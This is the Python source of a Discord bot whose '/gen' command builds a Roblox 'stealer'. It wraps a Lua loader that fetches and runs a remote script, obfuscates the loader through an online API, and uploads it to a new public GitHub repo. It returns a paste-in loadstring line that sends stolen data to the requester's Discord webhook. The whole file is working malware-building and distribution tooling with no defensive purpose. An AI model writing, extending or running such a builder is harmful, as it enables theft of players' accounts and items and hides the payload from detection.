import discord
from discord import app_commands
import requests
import base64

TOKEN = "YOUR_DISCORD_BOT_TOKEN"
GITHUB_TOKEN = "YOUR_GITHUB_TOKEN"
GITHUB_USER = "yourgithub"
LUA_OBF_API_KEY = "YOUR_LUAOBFUSCATOR_API_KEY"

client = discord.Client(intents=discord.Intents.default())
tree = app_commands.CommandTree(client)


def obfuscate_lua(code: str):

    # STEP 1 – Create session
    session_resp = requests.post(
        "https://api.luaobfuscator.com/v1/obfuscator/session",
        headers={
            "apikey": LUA_OBF_API_KEY,
            "content-type": "application/json"
        },
        json={"input": code}
    )

    if session_resp.status_code != 200:
        print("Failed to create obfuscation session:", session_resp.text)
        return None

    session_id = session_resp.json().get("session")

    if not session_id:
        print("No session ID returned")
        return None

    # STEP 2 – Apply settings
    options_resp = requests.post(
        f"https://api.luaobfuscator.com/v1/obfuscator/{session_id}",
        headers={
            "apikey": LUA_OBF_API_KEY,
            "content-type": "application/json"
        },
        json={
            "RenameGlobals": True,
            "RenameVariables": True,
            "RenameFunctions": True,
            "EncryptStrings": True
        }
    )

    if options_resp.status_code != 200:
        print("Failed to set obfuscation options:", options_resp.text)
        return None

    # STEP 3 – Get obfuscated output
    result_resp = requests.get(
        f"https://api.luaobfuscator.com/v1/obfuscator/{session_id}/download",
        headers={
            "apikey": LUA_OBF_API_KEY
        }
    )

    if result_resp.status_code != 200:
        print("Failed to fetch obfuscated script:", result_resp.text)
        return None

    return result_resp.text


def create_repo(name):
    r = requests.post(
        "https://api.github.com/user/repos",
        headers={"Authorization": f"token {GITHUB_TOKEN}"},
        json={"name": name, "private": False}
    )
    return r.json()


def upload_file(repo, filename, content):
    encoded = base64.b64encode(content.encode()).decode()
    r = requests.put(
        f"https://api.github.com/repos/{GITHUB_USER}/{repo}/contents/{filename}",
        headers={"Authorization": f"token {GITHUB_TOKEN}"},
        json={
            "message": "Generated stealer",
            "content": encoded
        }
    )
    return r.json()


@tree.command(
    name="gen",
    description="Generate sab stealer"
)
@app_commands.describe(username="Roblox username", webhook="Webhook URL")
async def gen(interaction: discord.Interaction, username: str, webhook: str):

    webhook_stripped = webhook.replace("https://discord.com/api/webhooks/", "")
    ername = username

    lua_script = f'''
_G.username ={ername}
_G.webhook ={webhook_stripped}
loadstring(game:HttpGet("https://raw.githubusercontent.com/nothingboygood-wq/game/refs/heads/main/Protected_4803870071579077.lua"))() 
'''

    await interaction.response.defer()

    obf = obfuscate_lua(lua_script)

    if not obf:
        await interaction.followup.send("Obfuscation failed.")
        return

    repo_name = f"{username}-logging"
    repo_resp = create_repo(repo_name)

    if "message" in repo_resp and "name already exists" in repo_resp["message"]:
        pass
    elif "id" not in repo_resp:
        await interaction.followup.send("Failed to create repo.")
        return

    upload_resp = upload_file(repo_name, "gg.lua", obf)
    raw = upload_resp.get("content", {}).get("download_url")

    embed = discord.Embed(
        title="Script Generated",
        description=f"```\nloadstring(game:HttpGet('{raw}'))()\n```",
        color=0x00ff00
    )

    await interaction.followup.send(embed=embed)


@client.event
async def on_ready():
    await tree.sync()
    print(f"Bot online as {client.user}")


client.run(TOKEN)
